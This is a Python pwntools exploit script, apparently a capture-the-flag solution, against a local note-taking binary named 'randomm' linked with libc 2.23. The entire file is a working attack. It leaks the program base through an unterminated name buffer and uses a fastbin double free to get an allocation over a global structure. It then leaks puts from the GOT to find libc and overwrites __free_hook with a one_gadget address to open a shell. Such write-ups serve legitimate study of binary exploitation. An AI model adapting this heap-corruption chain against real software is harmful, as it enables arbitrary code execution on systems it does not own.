from pwn import *

#context(os='linux', arch='amd64', log_level='debug')

p = process('./randomm')

elf = ELF('./randomm')
libc = ELF('./libc-2.23.so')

def g(p):
    gdb.attach(p)
    raw_input()

def add(size, content, another_note):
    p.recvuntil('?(Y/N)\n')
    p.sendline('Y')
    p.recvuntil('Input the size of the note:\n')
    p.sendline(str(size))
    p.recvuntil('Input the content of the note:\n')
    p.send(content)
    p.recvuntil('Do you want to add another note, tomorrow?(Y/N)\n')
    if(another_note):
        p.sendline('Y')
    else:
        p.sendline('N')

def update(index, content):
    p.recvuntil('?(Y/N)\n')
    p.sendline('Y')
    p.recvuntil('Input the index of the note:\n')
    p.sendline(str(index))
    p.recvuntil('Input the new content of the note:\n')
    p.send(content)

def delete(index):
    p.recvuntil('?(Y/N)\n')
    p.sendline('Y')
    p.recvuntil('Input the index of the note:\n')
    p.sendline(str(index))

def view(index):
    p.recvuntil('?(Y/N)\n')
    p.sendline('Y')
    p.recvuntil('Input the index of the note:\n')
    p.sendline(str(index))
    result = p.recvuntil('\n')
    return result[:-1]

def no(num):
    for i in range(int(num)):
        p.recvuntil('?(Y/N)\n')
        p.sendline('N')

## leak image_base_addr

p.recvuntil('Please input your name:\n')
p.send('a' * 8)
p.recvuntil('a' * 8)

image_base_addr = u64(p.recv(6).ljust(8, '\0')) - 0xb90
print 'image_base_addr: ' + hex(image_base_addr)

p.sendline('30')

## do double free

p.recvuntil('How many times do you want to play this game today?(0~10)\n')
p.sendline('8')  # 8 add
add(17, 'bbbb\n', True) # index 0
no(7)

p.recvuntil('How many times do you want to play this game today?(0~10)\n')
p.sendline('7') # 15 view
no(7 + 2)

## continue malloc to control 

p.recvuntil('How many times do you want to play this game today?(0~10)\n')
p.sendline('2') # 17 add
add(0x21,'\n', False) # index 1  // fake_chunk->size
no(1)

p.recvuntil('How many times do you want to play this game today?(0~10)\n')
p.sendline('2') # 19 add
offset = 0x203180
add(17, p64(image_base_addr + offset+0x10) + '\n', False) ## index 2  // set double_free_chunk -> attack_address
no(1)

p.recvuntil('How many times do you want to play this game today?(0~10)\n')
p.sendline('1') # 20 add 
add(17, "1111111\n", False)  # index 3  // fake_chunk's next_chunk->size ,prevent error when free fake_chunk

## do some padding and free one chunk in order to align fast_bin to 10

p.recvuntil('How many times do you want to play this game today?(0~10)\n')
p.sendline('6')  
no(6)

p.recvuntil('How many times do you want to play this game today?(0~10)\n')
p.sendline('1')  
delete(0)

p.recvuntil('How many times do you want to play this game today?(0~10)\n')
p.sendline('1') # 28 
no(1)

## malloc to (qword_203180 +0x10) and fill ptr into got

p.recvuntil('How many times do you want to play this game today?(0~10)\n')
p.sendline('10')  # 38 add -> update -> view -> update -> delete -> delete -> delete -> update 
add(17, p64(image_base_addr + elf.got['puts'])+p64(0x11) + '\n', False) # index 0
no(1)

## leak libc address and fill __free_hook into one_gadget

result = view(2)
libc_base_addr = u64(result.ljust(8, '\0')) - libc.symbols['puts']
print 'libc_base_addr: ' + hex(libc_base_addr)
one_gadget=libc_base_addr+0x4526a
update(0, p64(libc_base_addr + libc.symbols['__free_hook'])+p64(0x11) + '\n')
no(3)
update(2, p64(one_gadget) + '\n')

## while free(node) ,get shell

p.interactive()
